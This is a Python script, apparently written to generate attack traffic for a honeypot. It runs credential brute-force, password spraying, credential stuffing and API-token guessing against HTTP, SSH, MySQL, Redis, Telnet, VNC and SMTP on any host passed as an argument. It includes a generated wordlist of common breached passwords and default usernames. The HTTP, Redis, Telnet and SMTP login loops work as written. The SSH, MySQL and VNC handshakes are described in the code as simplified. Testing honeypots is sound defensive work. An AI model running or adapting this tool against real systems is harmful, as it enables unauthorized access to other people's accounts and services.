"""
Advanced Password Cracking Attack Simulations
Simulates sophisticated password cracking techniques against multiple services
"""

import socket
import time
import requests
import random
import base64
import hashlib
import threading
from itertools import product
import string

def generate_wordlist():
    """Generate comprehensive password wordlist"""
    # Common passwords from real breaches
    common_passwords = [
        "123456", "password", "123456789", "12345678", "12345", "1234567",
        "qwerty", "abc123", "password123", "admin", "letmein", "welcome",
        "monkey", "dragon", "master", "sunshine", "princess", "football",
        "charlie", "aa123456", "password1", "qwerty123", "123123", "111111",
        "iloveyou", "administrator", "root", "toor", "user", "guest"
    ]
    
    # Dictionary words
    dictionary_words = [
        "apple", "banana", "orange", "computer", "internet", "security",
        "network", "server", "database", "system", "manager", "office",
        "company", "business", "windows", "linux", "cisco", "oracle"
    ]
    
    # Years and common numbers
    years = [str(year) for year in range(1950, 2026)]
    numbers = ["01", "02", "03", "123", "321", "000", "999", "007"]
    
    # Keyboard patterns
    keyboard_patterns = [
        "qwertyuiop", "asdfghjkl", "zxcvbnm", "qwerty", "asdf", "zxcv",
        "123qwe", "qwe123", "asd123", "zxc123", "1q2w3e", "1qaz2wsx"
    ]
    
    # Generate combinations
    wordlist = set(common_passwords + dictionary_words + years + numbers + keyboard_patterns)
    
    # Add variations
    variations = set()
    for word in list(wordlist)[:50]:  # Limit to prevent explosion
        # Capitalization
        variations.add(word.capitalize())
        variations.add(word.upper())
        
        # Add numbers
        for num in ["1", "12", "123", "2023", "2024", "2025"]:
            variations.add(word + num)
            variations.add(num + word)
        
        # Add special characters
        for char in ["!", "@", "#", "$"]:
            variations.add(word + char)
            variations.add(char + word)
    
    wordlist.update(variations)
    
    # Add service-specific passwords
    service_passwords = [
        "mysql", "redis", "telnet", "vnc", "smtp", "ftp", "ssh",
        "database", "db", "cache", "mail", "email", "remote"
    ]
    wordlist.update(service_passwords)
    
    return list(wordlist)

def http_password_attack(target, port=8080, num_attempts=200):
    """Advanced HTTP authentication attacks"""
    print(f"[*] Starting HTTP password attacks against {target}:{port}")
    
    wordlist = generate_wordlist()
    usernames = ["admin", "administrator", "root", "user", "test", "guest", "manager", "operator"]
    
    results = []
    attack_patterns = [
        "basic_auth", "form_based", "json_api", "digest_auth", "bearer_token"
    ]
    
    for i in range(num_attempts):
        username = random.choice(usernames)
        password = random.choice(wordlist)
        attack_type = random.choice(attack_patterns)
        
        try:
            if attack_type == "basic_auth":
                # HTTP Basic Authentication
                credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
                headers = {"Authorization": f"Basic {credentials}"}
                url = f"http://{target}:{port}/admin"
                r = requests.get(url, headers=headers, timeout=3)
                
            elif attack_type == "form_based":
                # Form-based login
                url = f"http://{target}:{port}/login"
                data = {
                    "username": username,
                    "password": password,
                    "submit": "Login",
                    "remember": "on"
                }
                r = requests.post(url, data=data, timeout=3)
                
            elif attack_type == "json_api":
                # JSON API authentication
                url = f"http://{target}:{port}/api/auth"
                headers = {"Content-Type": "application/json"}
                data = {
                    "username": username,
                    "password": password,
                    "grant_type": "password"
                }
                r = requests.post(url, json=data, headers=headers, timeout=3)
                
            elif attack_type == "digest_auth":
                # HTTP Digest Authentication simulation
                url = f"http://{target}:{port}/secure"
                # First request to get challenge
                r1 = requests.get(url, timeout=3)
                # Second request with digest
                from requests.auth import HTTPDigestAuth
                auth = HTTPDigestAuth(username, password)
                r = requests.get(url, auth=auth, timeout=3)
                
            elif attack_type == "bearer_token":
                # Bearer token brute force
                token = base64.b64encode(f"{username}:{password}".encode()).decode()
                headers = {"Authorization": f"Bearer {token}"}
                url = f"http://{target}:{port}/api/protected"
                r = requests.get(url, headers=headers, timeout=3)
            
            results.append((attack_type, username, password, r.status_code))
            
        except Exception as e:
            results.append((attack_type, username, password, f"ERROR: {str(e)}"))
        
        time.sleep(0.1)  # Rate limiting
    
    return results

def ssh_password_attack(target, port=2222, num_attempts=150):
    """SSH password brute force with advanced techniques"""
    print(f"[*] Starting SSH password attacks against {target}:{port}")
    
    wordlist = generate_wordlist()
    usernames = ["root", "admin", "user", "ubuntu", "centos", "debian", "pi", "oracle", "postgres"]
    
    results = []
    
    for i in range(num_attempts):
        username = random.choice(usernames)
        password = random.choice(wordlist)
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            
            # Receive banner
            banner = s.recv(1024)
            
            # Send client version
            client_version = f"SSH-2.0-PasswordCracker_{random.randint(1000,9999)}\r\n"
            s.sendall(client_version.encode())
            
            # Simulate key exchange (simplified)
            try:
                kex_data = s.recv(4096)
            except:
                pass
            
            # Send authentication attempt
            auth_data = f"auth:{username}:{password}\n".encode()
            s.sendall(auth_data)
            
            try:
                response = s.recv(1024)
                results.append((username, password, "attempted", len(response)))
            except:
                results.append((username, password, "no_response", 0))
            
            s.close()
            
        except Exception as e:
            results.append((username, password, "connection_failed", str(e)))
        
        time.sleep(0.2)
    
    return results

def mysql_password_attack(target, port=3306, num_attempts=100):
    """MySQL password brute force"""
    print(f"[*] Starting MySQL password attacks against {target}:{port}")
    
    wordlist = generate_wordlist()
    usernames = ["root", "admin", "mysql", "user", "db", "database", "app", "web"]
    
    results = []
    
    for i in range(num_attempts):
        username = random.choice(usernames)
        password = random.choice(wordlist)
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            
            # Receive handshake
            handshake = s.recv(1024)
            
            if len(handshake) > 4:
                # Extract salt and other info (simplified)
                # In real attack, would parse MySQL protocol properly
                
                # Send authentication packet (simplified)
                auth_packet = f"AUTH:{username}:{password}".encode()
                packet_length = len(auth_packet)
                packet_header = packet_length.to_bytes(3, 'little') + b'\x01'
                
                s.sendall(packet_header + auth_packet)
                
                try:
                    response = s.recv(1024)
                    results.append((username, password, "attempted", len(response)))
                except:
                    results.append((username, password, "no_response", 0))
            
            s.close()
            
        except Exception as e:
            results.append((username, password, "connection_failed", str(e)))
        
        time.sleep(0.3)
    
    return results

def redis_password_attack(target, port=6379, num_attempts=80):
    """Redis password brute force"""
    print(f"[*] Starting Redis password attacks against {target}:{port}")
    
    wordlist = generate_wordlist()
    redis_specific = ["redis", "cache", "session", "queue", "pub", "sub"]
    wordlist.extend(redis_specific)
    
    results = []
    
    for i in range(num_attempts):
        password = random.choice(wordlist)
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            
            # Send AUTH command
            auth_cmd = f"*2\r\n$4\r\nAUTH\r\n${len(password)}\r\n{password}\r\n"
            s.sendall(auth_cmd.encode())
            
            response = s.recv(1024)
            results.append((password, response.decode('utf-8', errors='replace')[:50]))
            
            s.close()
            
        except Exception as e:
            results.append((password, f"ERROR: {str(e)}"))
        
        time.sleep(0.2)
    
    return results

def telnet_password_attack(target, port=23, num_attempts=120):
    """Telnet password brute force"""
    print(f"[*] Starting Telnet password attacks against {target}:{port}")
    
    wordlist = generate_wordlist()
    usernames = ["root", "admin", "user", "guest", "operator", "manager", "support"]
    
    results = []
    
    for i in range(num_attempts):
        username = random.choice(usernames)
        password = random.choice(wordlist)
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            
            # Receive initial banner/prompt
            initial_data = s.recv(1024)
            
            # Send username
            s.sendall(f"{username}\r\n".encode())
            time.sleep(0.5)
            
            # Receive password prompt
            pwd_prompt = s.recv(1024)
            
            # Send password
            s.sendall(f"{password}\r\n".encode())
            time.sleep(1)
            
            # Receive response
            response = s.recv(1024)
            results.append((username, password, response.decode('utf-8', errors='replace')[:100]))
            
            s.close()
            
        except Exception as e:
            results.append((username, password, f"ERROR: {str(e)}"))
        
        time.sleep(0.3)
    
    return results

def vnc_password_attack(target, port=5900, num_attempts=60):
    """VNC password brute force"""
    print(f"[*] Starting VNC password attacks against {target}:{port}")
    
    wordlist = generate_wordlist()
    vnc_specific = ["vnc", "remote", "desktop", "screen", "view", "access"]
    wordlist.extend(vnc_specific)
    
    results = []
    
    for i in range(num_attempts):
        password = random.choice(wordlist)
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            
            # Receive protocol version
            protocol = s.recv(12)
            
            # Send client protocol version
            s.sendall(b"RFB 003.008\n")
            
            # Receive security types
            security_data = s.recv(1024)
            
            if len(security_data) >= 2:
                # Choose VNC authentication if available
                s.sendall(b'\x02')  # VNC auth
                
                # Receive challenge
                challenge = s.recv(16)
                
                if len(challenge) == 16:
                    # Simple password encryption simulation
                    # In real VNC, this uses DES encryption
                    password_bytes = password.encode()[:8].ljust(8, b'\x00')
                    # Simplified "encryption"
                    encrypted = bytes(a ^ b for a, b in zip(password_bytes, b"12345678"))
                    encrypted = encrypted.ljust(16, b'\x00')
                    
                    s.sendall(encrypted)
                    
                    # Receive authentication result
                    auth_result = s.recv(4)
                    results.append((password, "attempted", len(auth_result)))
            
            s.close()
            
        except Exception as e:
            results.append((password, f"ERROR: {str(e)}", 0))
        
        time.sleep(0.2)
    
    return results

def smtp_password_attack(target, port=25, num_attempts=100):
    """SMTP authentication brute force"""
    print(f"[*] Starting SMTP password attacks against {target}:{port}")
    
    wordlist = generate_wordlist()
    usernames = ["admin", "postmaster", "mail", "email", "smtp", "user", "noreply"]
    
    results = []
    
    for i in range(num_attempts):
        username = random.choice(usernames)
        password = random.choice(wordlist)
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            
            # Receive banner
            banner = s.recv(1024)
            
            # Send EHLO
            s.sendall(b"EHLO attacker.com\r\n")
            ehlo_response = s.recv(1024)
            
            # Try AUTH PLAIN
            s.sendall(b"AUTH PLAIN\r\n")
            auth_response = s.recv(1024)
            
            if b"334" in auth_response:  # Server expects auth data
                # Encode credentials
                auth_string = f"\x00{username}\x00{password}"
                auth_encoded = base64.b64encode(auth_string.encode()).decode()
                
                s.sendall(f"{auth_encoded}\r\n".encode())
                final_response = s.recv(1024)
                
                results.append((username, password, final_response.decode('utf-8', errors='replace')[:50]))
            
            s.close()
            
        except Exception as e:
            results.append((username, password, f"ERROR: {str(e)}"))
        
        time.sleep(0.2)
    
    return results

def hybrid_attack_patterns(target):
    """Advanced hybrid attack patterns"""
    print(f"[*] Starting hybrid password attacks against {target}")
    
    results = []
    
    # Password spraying (same password, multiple accounts)
    spray_passwords = ["password", "123456", "admin", "Password123!", "Welcome1"]
    spray_usernames = ["admin", "user", "test", "guest", "root", "administrator"]
    
    print("  [+] Password spraying attack...")
    for password in spray_passwords:
        for username in spray_usernames[:3]:  # Limit to prevent lockout
            # Try against multiple services
            for service_port in [8080, 2222, 3306]:
                try:
                    # Simplified attempt
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target, service_port))
                    s.sendall(f"{username}:{password}".encode())
                    s.recv(1024)
                    s.close()
                    results.append(("spray", service_port, username, password, "attempted"))
                except:
                    results.append(("spray", service_port, username, password, "failed"))
                time.sleep(0.1)
    
    # Credential stuffing (username:password combinations from breaches)
    print("  [+] Credential stuffing attack...")
    breach_combos = [
        ("admin", "password"), ("root", "toor"), ("user", "user"),
        ("test", "test"), ("guest", "guest"), ("administrator", "admin"),
        ("mysql", "mysql"), ("redis", "redis"), ("postgres", "postgres")
    ]
    
    for username, password in breach_combos:
        for service_port in [8080, 25, 3306, 6379]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, service_port))
                s.sendall(f"CRED:{username}:{password}".encode())
                s.recv(1024)
                s.close()
                results.append(("stuffing", service_port, username, password, "attempted"))
            except:
                results.append(("stuffing", service_port, username, password, "failed"))
            time.sleep(0.1)
    
    # Token/API key brute force
    print("  [+] Token brute force attack...")
    token_patterns = [
        "admin_token_123", "api_key_456", "bearer_789",
        "sk_test_123456", "pk_live_789012", "jwt_secret_key"
    ]
    
    for token in token_patterns:
        try:
            headers = {"Authorization": f"Bearer {token}"}
            r = requests.get(f"http://{target}:8080/api/admin", headers=headers, timeout=2)
            results.append(("token", 8080, "api", token, r.status_code))
        except:
            results.append(("token", 8080, "api", token, "failed"))
        time.sleep(0.1)
    
    return results

def advanced_password_cracking_simulation(target):
    """Main function to run all password cracking simulations"""
    print(f"\n{'='*60}")
    print("🔓 ADVANCED PASSWORD CRACKING SIMULATION")
    print(f"{'='*60}")
    print(f"Target: {target}")
    print("Simulating real-world password attacks...")
    print(f"{'='*60}")
    
    all_results = {}
    
    # Run attacks against different services
    attack_functions = [
        ("HTTP Authentication", lambda: http_password_attack(target)),
        ("SSH Brute Force", lambda: ssh_password_attack(target)),
        ("MySQL Authentication", lambda: mysql_password_attack(target)),
        ("Redis Authentication", lambda: redis_password_attack(target)),
        ("Telnet Brute Force", lambda: telnet_password_attack(target)),
        ("VNC Authentication", lambda: vnc_password_attack(target)),
        ("SMTP Authentication", lambda: smtp_password_attack(target)),
        ("Hybrid Attacks", lambda: hybrid_attack_patterns(target))
    ]
    
    for attack_name, attack_func in attack_functions:
        print(f"\n[*] {attack_name}...")
        try:
            results = attack_func()
            all_results[attack_name] = results
            print(f"    Completed {len(results)} attempts")
        except Exception as e:
            print(f"    Error: {e}")
            all_results[attack_name] = []
    
    print(f"\n{'='*60}")
    total_attempts = sum(len(results) for results in all_results.values())
    print(f"[*] Password cracking simulation complete!")
    print(f"[*] Total password attempts: {total_attempts}")
    print(f"[*] Services targeted: {len(attack_functions)}")
    print("[*] Check honeypot logs for detailed attack data")
    print(f"{'='*60}")
    
    return all_results

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    advanced_password_cracking_simulation(target)
